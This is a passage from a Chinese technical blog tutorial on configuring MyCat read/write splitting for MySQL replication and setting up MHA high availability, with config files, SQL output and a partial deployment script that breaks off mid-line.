class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install java<br><br><span class="hljs-comment">##java 8版本</span><br>java -version<br>openjdk version <span class="hljs-string">&quot;1.8.0_342&quot;</span><br>OpenJDK Runtime Environment (build 1.8.0_342-b07)<br>OpenJDK 64-Bit Server VM (build 25.342-b07, mixed mode)<br></code></pre></td></tr></table></figure><p>启动mycat，监听的是8066和9066两个端口，对外暴露的，默认两个对外端口，可以修改的</p><p>对外暴露的端口默认是3306的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">mycat start<br>ss -ntl | grep 8066<br>LISTEN     0      100         :::8066                    :::*<br><br><span class="hljs-comment">##ss -ntlp：表示显示是哪个进程协议服务占用了这个端口，仅显示TCP连接，显示users，这个端口的进程</span><br>netstat -ntlp<br>[11:15:41 root@proxy ~]<span class="hljs-comment">#ss -ntlp | grep 8066</span><br>LISTEN     0      100         :::8066                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=11766,fd=86))<br>[11:15:51 root@proxy ~]<span class="hljs-comment">#ss -ntlp | grep 9066</span><br>LISTEN     0      100         :::9066                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=11766,fd=82))<br><br><span class="hljs-comment">##查看mycat的日志，/logs/wrapper.log</span><br>[11:18:26 root@proxy logs]<span class="hljs-comment">#tail -f wrapper.log </span><br>STATUS | wrapper  | 2022/09/17 11:14:07 | --&gt; Wrapper Started as Daemon<br>STATUS | wrapper  | 2022/09/17 11:14:07 | Launching a JVM...<br>INFO   | jvm 1    | 2022/09/17 11:14:08 | Wrapper (Version 3.2.3) http://wrapper.tanukisoftware.org<br>INFO   | jvm 1    | 2022/09/17 11:14:08 |   Copyright 1999-2006 Tanuki Software, Inc.  All Rights Reserved.<br>INFO   | jvm 1    | 2022/09/17 11:14:08 | <br>INFO   | jvm 1    | 2022/09/17 11:14:09 | MyCAT Server startup successfully. see logs <span class="hljs-keyword">in</span> logs/mycat.log<br></code></pre></td></tr></table></figure><p>修改mycat端口，默认这一段是注释掉的，需要复制新的，并且修改默认客户端端口号；对外暴露端口：3306，管理端口：9066</p><p>mycat默认连接用户：root，默认密码：123456，修改为123</p><p>/serverport，/user</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">/conf/server.xml<br><span class="hljs-comment">&lt;!--&lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt; --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;serverPort&quot;</span>&gt;</span>3306<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;managerPort&quot;</span>&gt;</span>9066<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span> <br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">defaultAccount</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;schemas&quot;</span>&gt;</span>TESTDB<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultSchema&quot;</span>&gt;</span>TESTDB<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-在后端MySQL上创建mycat连接用户"><a href="#3-在后端MySQL上创建mycat连接用户" class="headerlink" title="3.在后端MySQL上创建mycat连接用户"></a>3.在后端MySQL上创建mycat连接用户</h2><p>授权给到hellodb库的权限，读写权限，因为访问到proxy可以进行这个库的读写分离</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> mycat@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> mycat@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span>flush privileges;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h2 id="4-在schema-xml上实现读写分离的效果"><a href="#4-在schema-xml上实现读写分离的效果" class="headerlink" title="4.在schema.xml上实现读写分离的效果"></a>4.在schema.xml上实现读写分离的效果</h2><p>修改schema.xml文件，修改readhost和writehost，修改后短的节点</p><p>schema name：在mycat代理上显示给客户端看的DB名字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mycat</span>:schema <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;schema.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mycat:schema</span> <span class="hljs-attr">xmlns:mycat</span>=<span class="hljs-string">&quot;http://io.mycat/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">schema</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TESTDB&quot;</span> <span class="hljs-attr">checkSQLschema</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">sqlMaxLimit</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">dataNode</span>=<span class="hljs-string">&quot;dn1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">schema</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dataNode</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dn1&quot;</span> <span class="hljs-attr">dataHost</span>=<span class="hljs-string">&quot;localhost1&quot;</span> <span class="hljs-attr">database</span>=<span class="hljs-string">&quot;hellodb&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB名字 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dataHost</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localhost1&quot;</span> <span class="hljs-attr">maxCon</span>=<span class="hljs-string">&quot;1000&quot;</span> <span class="hljs-attr">minCon</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">balance</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">writeType</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">dbType</span>=<span class="hljs-string">&quot;mysql&quot;</span> <span class="hljs-attr">dbDriver</span>=<span class="hljs-string">&quot;native&quot;</span> <span class="hljs-attr">switchType</span>=<span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-attr">slaveThreshold</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">heartbeat</span>&gt;</span>select user()<span class="hljs-tag">&lt;/<span class="hljs-name">heartbeat</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">writeHost</span> <span class="hljs-attr">host</span>=<span class="hljs-string">&quot;host1&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;10.0.0.132:3306&quot;</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&quot;mycat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;123&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB1的IP --&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">readHost</span> <span class="hljs-attr">host</span>=<span class="hljs-string">&quot;host2&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;10.0.0.128:3306&quot;</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&quot;mycat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB2的IP --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">writeHost</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dataHost</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mycat:schema</span>&gt;</span><br></code></pre></td></tr></table></figure><p>验证修改server和schema后的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##重启服务</span><br>mycat restart<br><br><span class="hljs-comment">##查看日志，jvm1，证明是java编译的东西</span><br><span class="hljs-built_in">tail</span> -f /apps/mycat/logs/wrappers.log<br>INFO   | jvm 1    | 2022/09/17 14:15:46 | MyCAT Server startup successfully. see logs <span class="hljs-keyword">in</span> logs/mycat.log<br><br><span class="hljs-comment">##查看机器的监听端口是不是修改成3306了</span><br>ss -ntlp | grep 3306<br>LISTEN     0      100         :::3306                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=50461,fd=86))<br><br><span class="hljs-comment">##客户端连接到mycat代理，随便找个网络通的，查询发现就是hellodb的内容，可直接进行读写操作</span><br>mysql -uroot -p123 -h 10.0.0.130<br>mysql&gt; show databases;;<br>+----------+<br>| DATABASE |<br>+----------+<br>| TESTDB   |<br>+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_hellodb |<br>+-------------------+<br>| classes           |<br>| coc               |<br>| courses           |<br>| scores            |<br>| stu               |<br>| teachers          |<br>| testlog           |<br>| toc               |<br>+-------------------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br></code></pre></td></tr></table></figure><h2 id="5-验证mycat读写分离到server1和2的效果，使用general-log通用日志实现"><a href="#5-验证mycat读写分离到server1和2的效果，使用general-log通用日志实现" class="headerlink" title="5.验证mycat读写分离到server1和2的效果，使用general_log通用日志实现"></a>5.验证mycat读写分离到server1和2的效果，使用general_log通用日志实现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs sql">##开启server1和server2的general_log日志<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@general</span>_log;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@general</span>_log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><span class="hljs-operator">|</span>             <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><span class="hljs-operator">|</span> general_log      <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>                    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> general_log_file <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>rocky.log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><span class="hljs-operator">|</span> general_log      <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>                     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> general_log_file <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>master.log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><br>bash上开启<br>tail <span class="hljs-operator">-</span>f <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>rocky.log<br>tail <span class="hljs-operator">-</span>f <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>master.log<br><br>由ubuntu客户端向mycat进行写入<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;mycat&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br><br>##位于<span class="hljs-number">132</span>主节点，日志有记录，从节点上只有一个同步的事务记录下来了<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.211746</span>Z  <span class="hljs-number">112</span> Query<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;mycat&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>)<br><br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.215598</span>Z    <span class="hljs-number">7</span> Query<span class="hljs-keyword">BEGIN</span><br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.216535</span>Z    <span class="hljs-number">7</span> Query<span class="hljs-keyword">COMMIT</span> <span class="hljs-comment">/* implicit, from Xid_log_event */</span><br><br>##查询一下查询的操作，是哪个server，看server id，查询的是<span class="hljs-number">128</span>从节点<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@server</span>_id;<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@server</span>_id;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@server</span>_id <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span>         <span class="hljs-number">128</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><br>##更新操作试试，已经修改为serverid，正是<span class="hljs-number">132</span>的id，证明读写分离是OK的<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">update</span> teachers <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span>@<span class="hljs-variable">@server</span>_id <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">13</span>;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">13</span>;;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name  <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">13</span> <span class="hljs-operator">|</span> mycat <span class="hljs-operator">|</span> <span class="hljs-number">132</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br></code></pre></td></tr></table></figure><h2 id="heartbeat-select-user-用途"><a href="#heartbeat-select-user-用途" class="headerlink" title="heartbeat() select user()用途"></a>heartbeat() select user()用途</h2><p>用于后端MySQL服务器的心跳检测，mycat服务器周期性的向后端MySQL机器发送健康检查的指令，=select一下用户，如果又返回结果，则证明可以MySQL服务是存活的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">2022-09-17T06:33:46.730245Z   20 Queryselect user()<br>2022-09-17T06:33:56.730453Z   16 Queryselect user()<br>2022-09-17T06:34:06.731198Z   18 Queryselect user()<br></code></pre></td></tr></table></figure><h1 id="mycat暂时性的痛点"><a href="#mycat暂时性的痛点" class="headerlink" title="mycat暂时性的痛点"></a>mycat暂时性的痛点</h1><p>1.本身的proxy节点就存在单点故障的问题</p><p>2.无法保证后端主节点挂掉后，从节点可以替换上来，可以使用MHA高可用来实现</p><p>重点：MySQL主从复制的实现，主从数据的同步，binlog的pos记录，配置，可以在5.7后的版本开启gtid自动记录binlog的pos，可以比较简便的实现主从复制的binlog pos</p><p><img src="2792175-20220925210232184-713712725.png" alt="image-20220917150318330"></p><h1 id="MySQL-MHA实现高可用"><a href="#MySQL-MHA实现高可用" class="headerlink" title="MySQL MHA实现高可用"></a>MySQL MHA实现高可用</h1><p>实现从节点自动替换主节点工作，也就是sql server的always on方案</p><p>always on高可用方案：自动实现故障转移，A为主，B为从，A故障业务自动转向B，或者是有提出业务的方法等，建立always on集群节点，对外暴露一个虚拟的IP，程序只需要对接到这个IP，至于后端是哪台更新机/查询机工作，并不重要</p><p>—-&gt;always on高可用性组</p><p>恢复数据的办法：</p><p>通过MHA也好，alwaysOn方案也好，终究数据在同步的时候都是存在延迟的；而一个借点挂了的话，要从节点提升一个新主上来，从必然会有一部分的数据丢失，这一点可以由MHA或者是alwayson集群管理来实现，尽可能通过redo log/binlog来恢复数据，也可以人工手动恢复数据</p><p>MySQL的实现方案：MHA高可用方案—-&gt;非常常用，一般是一主一从，也可以一主多从等这样的架构，现在阿里云上面的RDS主备架构估计也就MHA机制实现的</p><p>高可用方案的可靠性：一定要做到非常可靠，当然数据完全不丢失也不太可能，最好做到尽量不丢失，主要还是看企业内的业务需要使用怎么样的数据库，对应好怎么样的高可用方案；不同类型的DB，高可用方案不同</p><p><img src="2792175-20220925210232507-861981288.png" alt="image-20220918000235482"></p><h2 id="MHA的实现原理"><a href="#MHA的实现原理" class="headerlink" title="MHA的实现原理"></a>MHA的实现原理</h2><p>1.利用健康检查语句select来检查master-slave的健康性，一旦有宕机，则manager从master上保存二进制文件，监控健康情况</p><p>2.识别哪个slave同步的数据最新，因为slave同步数据，也需要经过调用SQL thread，而这个SQL进程不一定已经落盘了</p><p>3.应用中继日志relay_log到其他节点</p><p>4.将从master保存的最新binlog同步到所有slave节点—&gt;有个同步binlog的步骤—&gt;也可以手动将master节点的binlog拷贝过来(如果机器在坏的不多的情况下，只有服务挂了)</p><p>5.从slave内提升一个新的master(manager行为)</p><p>6.其他的slave指向新主(manager行为)</p><p>7.移除故障节点，开始修复</p><p>MHA对外的IP地址：VIP虚拟IP，类似SQL SERVER的alyways on高可用方案，集群提供虚拟IP，通过虚拟IP来决定读/写操作，VIP自动识别新的master节点，承载写操作</p><h2 id="安装部署MHA和MySQL主从环境"><a href="#安装部署MHA和MySQL主从环境" class="headerlink" title="安装部署MHA和MySQL主从环境"></a>安装部署MHA和MySQL主从环境</h2><p>MHA的包：分为管理节点和agent节点，server端和client端，管理节点负责管理各个MySQL集群，MySQL集群内包括主从节点都是管理节点的client端</p><p>server端：只能在Cent OS 7机器</p><p>node端：可以在Cent OS 8以上</p><p><img src="https://img2022.cnblogs.com/blog/2792175/202209/2792175-20220925210232800-689707363.png" alt="image-20220917235803160"></p><p>MHA检查MySQL集群的健康性：也是通过select来完成健康检查，一旦无反馈，则会认为这个manager有问题，这个集群有问题，直接提升一个从节点作为主节点</p><p>类似mycat代理通过select user()，查询语句来检查，always on节点肯定也有健康检查</p><p><img src="2792175-20220925210233054-521947166.png" alt="image-20220918121546698"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">环境：可以加个客户端<br>10.0.0.130 manager/mycat<br>10.0.0.132 master节点<br>10.0.0.128 slave1<br>10.0.0.129 slave2<br></code></pre></td></tr></table></figure><h2 id="1-配置主从节点关系，主从复制，my-cnf文件配置"><a href="#1-配置主从节点关系，主从复制，my-cnf文件配置" class="headerlink" title="1.配置主从节点关系，主从复制，my.cnf文件配置"></a>1.配置主从节点关系，主从复制，my.cnf文件配置</h2><p>master节点基本配置：服务端，开启gtid，自动识别事务，自动发现binlog的pos，主从都要开，不开的话，从节点会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>server-id=132 <span class="hljs-comment">##id</span><br>datadir=/data/mysql <span class="hljs-comment">##数据目录</span><br>log-bin=/data/mysql/binlog/rocky-bin <span class="hljs-comment">##binlog目录，指定binlog文件前缀</span><br>socket=/data/mysql/mysql.sock<br>log-error=/data/mysql/mysql.log <span class="hljs-comment">##错误日志目录</span><br>pid-file=/data/mysql/mysql.pid<br><span class="hljs-comment">#skip-grant-tables</span><br>default_authentication_plugin=mysql_native_password<br><span class="hljs-comment">#general_log ##开启general_log，这个可以在MySQL内set global general_log=1实现</span><br><br>rpl_semi_sync_master_enabled <span class="hljs-comment">##半同步复制，可以设置timeout的时间</span><br><br>gtid_mode=on <span class="hljs-comment">##开启gtid，自动识别事务，自动发现binlog的pos</span><br>enforce_gtid_consistency<br><br>[client]<br>socket=/data/mysql/mysql.sock<br></code></pre></td></tr></table></figure><p>slave基本配置：开启gtid，自动识别事务，自动发现binlog的pos，主从都要开，不开的话，从节点会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>server-id=128<br>log-bin=/data/mysql/binlog/slave-bin<br>datadir=/data/mysql<br>socket=/data/mysql/mysql.sock<br>log-error=/data/mysql/mysql.log<br>pid-file=/data/mysql/mysql.pid<br><br>rpl_semi_sync_slave_enabled <span class="hljs-comment">##半同步复制，可以设置timeout的时间</span><br><br>gtid_mode=on <span class="hljs-comment">##开启gtid，自动识别事务，自动发现binlog的pos，主从都要开，不开的话，从节点会报错</span><br>enforce_gtid_consistency<br>read_only<br><br>[client]<br>socket=/data/mysql/mysql.sock<br></code></pre></td></tr></table></figure><h2 id="2-安装管理端和node端"><a href="#2-安装管理端和node端" class="headerlink" title="2.安装管理端和node端"></a>2.安装管理端和node端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>host=(10.0.0.128<br>10.0.0.132<br>10.0.0.129)<br><br><span class="hljs-comment">##expect判断直接scp rpm包过去</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;host[*]&#125;</span>;<span class="hljs-keyword">do</span><br>        expect &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">        spawn scp mha4mysql-node-0.58-0.el7.centos.noarch.rpm $i:/root</span><br><span class="hljs-string">        expect &#123;</span><br><span class="hljs-string">             &quot;yes/no&quot; &#123; send &quot;yes\n&quot;; exp_continue &#125;</span><br><span class="hljs-string">             